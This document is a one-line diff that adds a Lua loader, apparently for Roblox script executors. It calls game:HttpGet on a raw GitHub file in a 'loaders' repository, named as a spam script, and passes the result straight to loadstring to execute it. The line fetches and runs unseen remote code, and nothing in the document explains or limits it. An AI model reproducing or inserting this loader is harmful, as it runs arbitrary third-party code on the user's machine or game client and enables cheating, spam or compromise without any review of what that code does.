@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/karinderya-spam7-i66cpmlvjey3z2.lua"))()
